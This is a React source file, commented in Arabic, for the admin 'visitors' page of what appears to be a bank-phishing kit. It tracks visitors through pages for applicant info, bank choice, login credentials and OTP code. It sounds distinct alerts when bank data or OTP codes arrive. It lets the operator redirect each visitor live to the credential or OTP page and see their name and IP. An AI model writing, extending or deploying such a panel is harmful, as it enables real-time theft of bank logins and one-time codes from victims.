// صفحة إدارة الزوار — عرض الزوار مع اسم العميل وتوجيههم وحظرهم وحذفهم
import { useEffect, useRef, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { useListSessions, getListSessionsQueryKey } from "@workspace/api-client-react";
import { timeAgo, useTimeTicker } from "@/lib/timeAgo";
import AdminLayout from "@/components/AdminLayout";
import {
  Globe, ShieldOff, ShieldCheck, Send, RefreshCw, Wifi, WifiOff,
  Navigation, User, UserX, Trash2, AlertTriangle, Circle, Bell, BellOff
} from "lucide-react";
import {
  subscribeToPush,
  unsubscribeFromPush,
  getExistingSubscription,
  isPushSupported
} from "@/lib/push";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

// نوع موسّع يشمل جميع حقول الجلسة القادمة من الخادم
interface SessionRow {
  id: string;
  isActive: boolean;
  isBlocked: boolean;
  blockedReason: string | null;
  country: string | null;
  ipAddress: string | null;
  userAgent: string | null;
  currentPage: string;
  lastSeenAt: string;
  applicantName: string | null;
}

// ─── حالة محلية لتتبع أسماء العملاء المحدثة فوراً ───────────────────────
interface RealtimeNames {
  [sessionId: string]: string;
}

const PAGE_OPTIONS = [
  { value: "home", label: "الرئيسية" },
  { value: "apply", label: "معلومات الطلب" },
  { value: "banks", label: "اختيار البنك" },
  { value: "credentials", label: "بيانات الدخول" },
  { value: "verify", label: "رمز التحقق" },
  { value: "waiting", label: "انتظار المراجعة" },
  { value: "success", label: "تمّت الموافقة" },
];

const pageLabels: Record<string, string> = Object.fromEntries(PAGE_OPTIONS.map(p => [p.value, p.label]));

function adminFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
}

// تحديد ما إذا كان المستخدم نشطاً حقاً (آخر نشاط خلال 35 ثانية + isActive)
function isReallyActive(session: { isActive: boolean; lastSeenAt: string }): boolean {
  const diff = Date.now() - new Date(session.lastSeenAt).getTime();
  return session.isActive && diff < 35000;
}

// ─── نظام الإشعارات الصوتية ────────────────────────────────────────────────
let _audioCtx: AudioContext | null = null;

function getAudioCtx(): AudioContext | null {
  try {
    const ACtx = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
    if (!_audioCtx) _audioCtx = new ACtx();
    return _audioCtx;
  } catch { return null; }
}

// ─── أنواع الأصوات ────────────────────────────────────────────────────────
// 1. زائر جديد: صوت خافت ترحيبي (دافئ)
// 2. بيانات شخصية: نغمة مزدوجة متوسطة (اعتراف)
// 3. بيانات البنك: نغمة مزدوجة حادة (انتباه)
// 4. رمز OTP: صوت حاد متتالي (تنبيه قوي)

function playSound(type: "visitor" | "personal" | "bank" | "otp", volume = 0.3) {
  const ctx = getAudioCtx();
  if (!ctx) return;

  const doPlay = () => {
    switch (type) {
      case "visitor": {
        // صوت ترحيبي خافت - مثل نغمة دافئة
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.type = "sine";
        osc.frequency.setValueAtTime(523, ctx.currentTime); // C5
        osc.frequency.setValueAtTime(659, ctx.currentTime + 0.15); // E5
        gain.gain.setValueAtTime(0, ctx.currentTime);
        gain.gain.linearRampToValueAtTime(volume * 0.6, ctx.currentTime + 0.05);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.4);
        break;
      }
      case "personal": {
        // نغمة مزدوجة متوسطة - "تم الاستلام"
        for (let i = 0; i < 2; i++) {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.type = "sine";
          osc.frequency.value = 587; // D5
          const start = ctx.currentTime + i * 0.25;
          gain.gain.setValueAtTime(0, start);
          gain.gain.linearRampToValueAtTime(volume * 0.8, start + 0.03);
          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2);
          osc.start(start);
          osc.stop(start + 0.2);
        }
        break;
      }
      case "bank": {
        // نغمة مزدوجة حادة - "انتباه مهم"
        for (let i = 0; i < 2; i++) {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.type = "triangle";
          osc.frequency.value = 784; // G5
          const start = ctx.currentTime + i * 0.2;
          gain.gain.setValueAtTime(0, start);
          gain.gain.linearRampToValueAtTime(volume, start + 0.02);
          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.18);
          osc.start(start);
          osc.stop(start + 0.18);
        }
        break;
      }
      case "otp": {
        // صوت حاد متتالي - "تنبيه قوي!"
        for (let i = 0; i < 4; i++) {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.type = "sawtooth";
          osc.frequency.setValueAtTime(880 + i * 50, ctx.currentTime + i * 0.12); // تصاعدي
          const start = ctx.currentTime + i * 0.12;
          gain.gain.setValueAtTime(0, start);
          gain.gain.linearRampToValueAtTime(volume * 0.7, start + 0.02);
          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.1);
          osc.start(start);
          osc.stop(start + 0.1);
        }
        break;
      }
    }
  };

  if (ctx.state === "suspended") {
    ctx.resume().then(doPlay).catch(() => {});
  } else {
    doPlay();
  }
}

export default function AdminVisitorsPage() {
  const queryClient = useQueryClient();
  const [wsConnected, setWsConnected] = useState(false);
  const wsRef = useRef<WebSocket | null>(null);
  const { data: rawSessions, refetch } = useListSessions({ query: { refetchInterval: 8000 } });
  const sessions = rawSessions as unknown as SessionRow[];
  
  // ─── الأسماء المحدثة فوراً من WebSocket ─────────────────────────────────
  const [realtimeNames, setRealtimeNames] = useState<RealtimeNames>({});

  // ─── تتبع الجلسات والطلبات المعروفة لتشغيل الأصوات صحيحاً ───────────────
  const seenSessionIds = useRef<Set<string>>(new Set());
  const seenAppIds = useRef<Set<number>>(new Set()); // لجميع أنواع الأحداث
  const sessionsInitialized = useRef(false);

  // تهيئة الجلسات المعروفة عند أول تحميل (لتجنب أصوات عند الدخول)
  useEffect(() => {
    if (!sessions || sessionsInitialized.current) return;
    sessions.forEach((s) => seenSessionIds.current.add(s.id));
    sessionsInitialized.current = true;
  }, [sessions]);

  const [soundsEnabled, setSoundsEnabled] = useState(false);
  const soundsEnabledRef = useRef(false);
  const [pushEnabled, setPushEnabled] = useState(false);
  const [pushSupported, setPushSupported] = useState(false);
  const pushSubscriptionRef = useRef<PushSubscription | null>(null);

  const handleToggleSounds = () => {
    const ctx = getAudioCtx();
    if (!ctx) return;
    ctx.resume().then(() => {
      const next = !soundsEnabledRef.current;
      soundsEnabledRef.current = next;
      setSoundsEnabled(next);
      if (next) playSound("visitor");
    }).catch(() => {});
  };

  // ─── Push Notifications handlers ─────────────────────────────────────────
  const handleTogglePush = async () => {
    if (pushEnabled) {
      // إلغاء الاشتراك
      if (pushSubscriptionRef.current) {
        await unsubscribeFromPush(pushSubscriptionRef.current);
        pushSubscriptionRef.current = null;
      }
      setPushEnabled(false);
    } else {
      // الاشتراك
      const sub = await subscribeToPush();
      if (sub) {
        pushSubscriptionRef.current = sub;
        setPushEnabled(true);
      }
    }
  };

  // فحص حالة Push عند التحميل
  useEffect(() => {
    const checkPush = async () => {
      const supported = isPushSupported();
      setPushSupported(supported);
      if (supported) {
        const existing = await getExistingSubscription();
        if (existing) {
          pushSubscriptionRef.current = existing;
          setPushEnabled(true);
        }
      }
    };
    checkPush();
  }, []);

  const [blockReasons, setBlockReasons] = useState<Record<string, string>>({});
  const [notifyMessages, setNotifyMessages] = useState<Record<string, string>>({});
  const [navigatePage, setNavigatePage] = useState<Record<string, string>>({});
  const [loading, setLoading] = useState<Record<string, boolean>>({});
  const [navSuccess, setNavSuccess] = useState<Record<string, string>>({});
  const [showDeleteAll, setShowDeleteAll] = useState(false);

  // تحديث تلقائي للوقت كل 30 ثانية
  useTimeTicker(30_000);

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const connect = () => {
      const ws = new WebSocket(`${protocol}//${window.location.host}/api/ws`);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => { setWsConnected(false); setTimeout(connect, 3000); };
      ws.onerror = () => setWsConnected(false);
      ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data);

          // ── زائر جديد: صوت ترحيبي خافت ──
          if (msg.type === "session_update" && msg.data?.id) {
            const sid = msg.data.id as string;
            if (!seenSessionIds.current.has(sid)) {
              seenSessionIds.current.add(sid);
              if (soundsEnabledRef.current) playSound("visitor");
            }
            queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
          }

          // ── تحديث بيانات الطلب ──
          if (msg.type === "application_update" && msg.data) {
            const app = msg.data as {
              id?: number;
              sessionId?: string;
              applicantName?: string;
              eventType?: "personal" | "bank" | "otp";
            };

            // ── تشغيل الصوت حسب نوع الحدث ──
            if (app.id && app.eventType && soundsEnabledRef.current) {
              const isNewApp = !seenAppIds.current.has(app.id);
              if (isNewApp) {
                seenAppIds.current.add(app.id);
                playSound(app.eventType);
              }
            }

            // ── تحديث اسم العميل فوراً في صفحة الزوار ──
            if (app.sessionId && app.applicantName) {
              setRealtimeNames(prev => ({
                ...prev,
                [app.sessionId!]: app.applicantName!,
              }));
            }
          }

          if (msg.type === "session_deleted" || msg.type === "all_sessions_deleted") {
            queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
          }
        } catch {
          queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
        }
      };
    };
    connect();
    return () => wsRef.current?.close();
  }, []);

  const handleBlock = async (sessionId: string, block: boolean) => {
    setLoading(l => ({ ...l, [sessionId]: true }));
    await adminFetch(`${BASE}/api/admin/sessions/${sessionId}/block`, {
      method: "POST",
      body: JSON.stringify({ block, reason: blockReasons[sessionId] || "" }),
    });
    setLoading(l => ({ ...l, [sessionId]: false }));
    queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
  };

  const handleNotify = async (sessionId: string) => {
    const message = notifyMessages[sessionId];
    if (!message) return;
    setLoading(l => ({ ...l, [`notify_${sessionId}`]: true }));
    await adminFetch(`${BASE}/api/admin/notify`, {
      method: "POST",
      body: JSON.stringify({ sessionId, message }),
    });
    setNotifyMessages(m => ({ ...m, [sessionId]: "" }));
    setLoading(l => ({ ...l, [`notify_${sessionId}`]: false }));
  };

  const handleNavigate = async (sessionId: string) => {
    const page = navigatePage[sessionId];
    if (!page) return;
    setLoading(l => ({ ...l, [`nav_${sessionId}`]: true }));
    try {
      await adminFetch(`${BASE}/api/admin/sessions/${sessionId}/navigate`, {
        method: "POST",
        body: JSON.stringify({ page }),
      });
      setNavSuccess(s => ({ ...s, [sessionId]: page }));
      setNavigatePage(m => ({ ...m, [sessionId]: "" }));
      setTimeout(() => setNavSuccess(s => { const n = { ...s }; delete n[sessionId]; return n; }), 4000);
      queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
    } finally {
      setLoading(l => ({ ...l, [`nav_${sessionId}`]: false }));
    }
  };

  const handleDelete = async (sessionId: string) => {
    if (!confirm("هل تريد نقل هذا الزائر لسلة المهملات؟")) return;
    setLoading(l => ({ ...l, [`del_${sessionId}`]: true }));
    await adminFetch(`${BASE}/api/admin/sessions/${sessionId}`, { method: "DELETE" });
    setLoading(l => ({ ...l, [`del_${sessionId}`]: false }));
    queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
  };

  const handleDeleteAll = async () => {
    setLoading(l => ({ ...l, deleteAll: true }));
    await adminFetch(`${BASE}/api/admin/sessions`, { method: "DELETE" });
    setLoading(l => ({ ...l, deleteAll: false }));
    setShowDeleteAll(false);
    queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
  };

  const activeCount = sessions?.filter(s => isReallyActive(s as any)).length ?? 0;

  return (
    <AdminLayout>
      <div className="p-6">
        {/* الرأس */}
        <div className="flex justify-between items-center mb-8 flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-black text-foreground">الزوار</h1>
            <p className="text-muted-foreground text-sm mt-1">
              {sessions?.length ?? 0} زائر • <span className="text-green-600 font-medium">{activeCount} نشط الآن</span>
            </p>
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            {/* زر الإشعارات الصوتية */}
            <button
              onClick={handleToggleSounds}
              title={soundsEnabled ? "إيقاف التنبيهات الصوتية" : "تفعيل التنبيهات الصوتية (مطلوب للمتصفح)"}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-bold border-2 transition-all ${
                soundsEnabled
                  ? "bg-green-100 border-green-400 text-green-700 hover:bg-green-200"
                  : "bg-muted border-border text-muted-foreground hover:bg-muted/80"
              }`}
            >
              {soundsEnabled ? "🔔" : "🔇"} 
              {soundsEnabled ? "صوت مفعّل" : "تفعيل الصوت"}
            </button>
            
            {/* زر Push Notifications */}
            {pushSupported && (
              <button
                onClick={handleTogglePush}
                title={pushEnabled ? "إيقاف الإشعارات (حتى عند إغلاق المتصفح)" : "تفعيل الإشعارات (حتى عند إغلاق المتصفح)"}
                className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-bold border-2 transition-all ${
                  pushEnabled
                    ? "bg-blue-100 border-blue-400 text-blue-700 hover:bg-blue-200"
                    : "bg-muted border-border text-muted-foreground hover:bg-muted/80"
                }`}
              >
                {pushEnabled ? <Bell className="w-4 h-4" /> : <BellOff className="w-4 h-4" />}
                {pushEnabled ? "إشعارات مفعّلة" : "تفعيل الإشعارات"}
              </button>
            )}
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <div className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium ${wsConnected ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"}`}>
              {wsConnected ? <Wifi className="w-4 h-4" /> : <WifiOff className="w-4 h-4" />}
              {wsConnected ? "متصل" : "غير متصل"}
            </div>
            <button onClick={() => refetch()} className="flex items-center gap-2 border rounded-xl px-4 py-2 text-sm font-medium hover:bg-muted transition-colors">
              <RefreshCw className="w-4 h-4" />
              تحديث
            </button>
            {/* حذف الكل */}
            {!showDeleteAll ? (
              <button
                onClick={() => setShowDeleteAll(true)}
                className="flex items-center gap-2 bg-red-100 text-red-700 border border-red-200 rounded-xl px-4 py-2 text-sm font-medium hover:bg-red-200 transition-colors"
              >
                <Trash2 className="w-4 h-4" />
                حذف الكل
              </button>
            ) : (
              <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-xl px-3 py-2">
                <AlertTriangle className="w-4 h-4 text-red-600" />
                <span className="text-xs text-red-700 font-medium">هل أنت متأكد؟</span>
                <button onClick={handleDeleteAll} disabled={loading.deleteAll}
                  className="bg-red-600 text-white px-3 py-1 rounded-lg text-xs font-bold hover:bg-red-700 disabled:opacity-50">
                  {loading.deleteAll ? "..." : "نعم، احذف"}
                </button>
                <button onClick={() => setShowDeleteAll(false)} className="text-xs text-muted-foreground hover:text-foreground">إلغاء</button>
              </div>
            )}
          </div>
        </div>

        <div className="bg-card border rounded-2xl overflow-hidden">
          {sessions && sessions.length > 0 ? (
            <div className="divide-y">
              {sessions.map((session) => {
                // استخدام الأسماء الفورية من WebSocket أولاً، ثم من البيانات
                const clientName = realtimeNames[session.id] || (session as any).applicantName as string | null;
                const active = isReallyActive(session as any);
                const isNew = !clientName;

                return (
                  <div key={session.id} className={`p-5 ${session.isBlocked ? "bg-red-50" : ""}`}>
                    <div className="flex flex-col lg:flex-row lg:items-start gap-4">
                      {/* معلومات الزائر */}
                      <div className="flex-1 min-w-0">
                        {/* الرأس: الاسم + الحالات */}
                        <div className="flex items-center gap-2 flex-wrap mb-3">
                          {/* مؤشر النشاط الآني */}
                          <span title={active ? "نشط الآن" : "غير نشط"}>
                            <Circle className={`w-2.5 h-2.5 fill-current ${active ? "text-green-500" : "text-gray-300"}`} />
                          </span>

                          {/* اسم العميل أو زائر جديد */}
                          {isNew ? (
                            <span className="flex items-center gap-1.5 bg-blue-50 text-blue-700 border border-blue-200 px-2.5 py-1 rounded-full text-xs font-bold">
                              <UserX className="w-3.5 h-3.5" />
                              زائر جديد
                            </span>
                          ) : (
                            <span className="flex items-center gap-1.5 font-bold text-primary text-sm">
                              <User className="w-4 h-4" />
                              {clientName}
                            </span>
                          )}

                          {/* حالة الحظر */}
                          {session.isBlocked && (
                            <span className="bg-red-100 text-red-700 text-xs px-2 py-0.5 rounded-full font-medium">محظور</span>
                          )}

                          {/* حالة النشاط */}
                          <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${active ? "bg-green-100 text-green-700" : "bg-gray-100 text-gray-500"}`}>
                            {active ? "نشط" : "غير نشط"}
                          </span>
                        </div>

                        {/* البيانات */}
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-sm">
                          <div>
                            <p className="text-xs text-muted-foreground mb-0.5">البلد</p>
                            <div className="flex items-center gap-1 font-medium">
                              <Globe className="w-3.5 h-3.5 text-muted-foreground" />
                              {session.country || "غير معروف"}
                            </div>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-0.5">الصفحة الحالية</p>
                            <span className="bg-primary/10 text-primary px-2 py-0.5 rounded text-xs font-medium">
                              {pageLabels[session.currentPage] || session.currentPage}
                            </span>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-0.5">آخر نشاط</p>
                            <p className="font-medium text-xs">{timeAgo(session.lastSeenAt)}</p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-0.5">
                              {isNew ? "المتصفح / الجهاز" : "عنوان IP"}
                            </p>
                            <p className="font-mono text-xs truncate">
                              {isNew
                                ? (session.userAgent?.split(" ").slice(0, 3).join(" ").slice(0, 35) || "—")
                                : (session.ipAddress || "—")}
                            </p>
                          </div>
                        </div>

                        {session.isBlocked && session.blockedReason && (
                          <p className="text-xs text-red-600 mt-2">سبب الحظر: {session.blockedReason}</p>
                        )}
                      </div>

                      {/* الإجراءات */}
                      <div className="flex flex-col gap-2 shrink-0 w-full lg:w-80">
                        {/* توجيه المستخدم */}
                        <div className="flex flex-col gap-1.5">
                          <div className="flex gap-2">
                            <select
                              value={navigatePage[session.id] || ""}
                              onChange={e => setNavigatePage(m => ({ ...m, [session.id]: e.target.value }))}
                              className="flex-1 border rounded-lg px-2 py-2 text-xs bg-background focus:outline-none focus:ring-2 focus:ring-primary/50"
                            >
                              <option value="">— وجّه المستخدم لصفحة —</option>
                              {PAGE_OPTIONS.map(p => (
                                <option key={p.value} value={p.value}>{p.label}</option>
                              ))}
                            </select>
                            <button
                              onClick={() => handleNavigate(session.id)}
                              disabled={loading[`nav_${session.id}`] || !navigatePage[session.id]}
                              className="bg-primary/10 text-primary px-3 py-2 rounded-lg text-xs font-medium disabled:opacity-50 flex items-center gap-1 hover:bg-primary/20 transition-colors"
                            >
                              <Navigation className="w-3.5 h-3.5" />
                              {loading[`nav_${session.id}`] ? "..." : "توجيه"}
                            </button>
                          </div>
                          {navSuccess[session.id] && (
                            <div className="flex items-center gap-1.5 bg-green-50 border border-green-200 text-green-700 px-3 py-1.5 rounded-lg text-xs font-medium">
                              <Navigation className="w-3 h-3" />
                              تم التوجيه إلى: <span className="font-bold">{pageLabels[navSuccess[session.id]] || navSuccess[session.id]}</span>
                            </div>
                          )}
                        </div>

                        {/* إرسال رسالة */}
                        <div className="flex gap-2">
                          <input
                            type="text"
                            placeholder="رسالة فورية..."
                            value={notifyMessages[session.id] || ""}
                            onChange={e => setNotifyMessages(m => ({ ...m, [session.id]: e.target.value }))}
                            onKeyDown={e => e.key === "Enter" && handleNotify(session.id)}
                            className="flex-1 border rounded-lg px-3 py-2 text-xs bg-background focus:outline-none focus:ring-2 focus:ring-primary/50"
                          />
                          <button
                            onClick={() => handleNotify(session.id)}
                            disabled={loading[`notify_${session.id}`] || !notifyMessages[session.id]}
                            className="navy-gradient text-white px-3 py-2 rounded-lg text-xs font-medium disabled:opacity-50 flex items-center gap-1 hover:opacity-90"
                          >
                            <Send className="w-3.5 h-3.5" />
                            إرسال
                          </button>
                        </div>

                        {/* حظر / رفع حظر + حذف */}
                        <div className="flex gap-2">
                          {!session.isBlocked && (
                            <input
                              type="text"
                              placeholder="سبب الحظر..."
                              value={blockReasons[session.id] || ""}
                              onChange={e => setBlockReasons(r => ({ ...r, [session.id]: e.target.value }))}
                              className="flex-1 border rounded-lg px-3 py-2 text-xs bg-background focus:outline-none focus:ring-2 focus:ring-primary/50"
                            />
                          )}
                          {session.isBlocked ? (
                            <button
                              onClick={() => handleBlock(session.id, false)}
                              disabled={loading[session.id]}
                              className="flex-1 flex items-center justify-center gap-2 bg-green-100 text-green-700 px-4 py-2 rounded-lg text-xs font-medium hover:bg-green-200 transition-colors disabled:opacity-50"
                            >
                              <ShieldCheck className="w-3.5 h-3.5" />
                              رفع الحظر
                            </button>
                          ) : (
                            <button
                              onClick={() => handleBlock(session.id, true)}
                              disabled={loading[session.id]}
                              className="flex items-center gap-2 bg-red-100 text-red-700 px-4 py-2 rounded-lg text-xs font-medium hover:bg-red-200 transition-colors disabled:opacity-50"
                            >
                              <ShieldOff className="w-3.5 h-3.5" />
                              حظر
                            </button>
                          )}
                          {/* حذف للسلة */}
                          <button
                            onClick={() => handleDelete(session.id)}
                            disabled={loading[`del_${session.id}`]}
                            title="نقل لسلة المهملات"
                            className="bg-gray-100 text-gray-600 px-3 py-2 rounded-lg text-xs font-medium hover:bg-gray-200 transition-colors disabled:opacity-50 flex items-center gap-1"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          ) : (
            <div className="p-12 text-center text-muted-foreground">
              <Globe className="w-12 h-12 mx-auto mb-4 opacity-30" />
              <p>لا يوجد زوار حتى الآن</p>
            </div>
          )}
        </div>
      </div>
    </AdminLayout>
  );
}
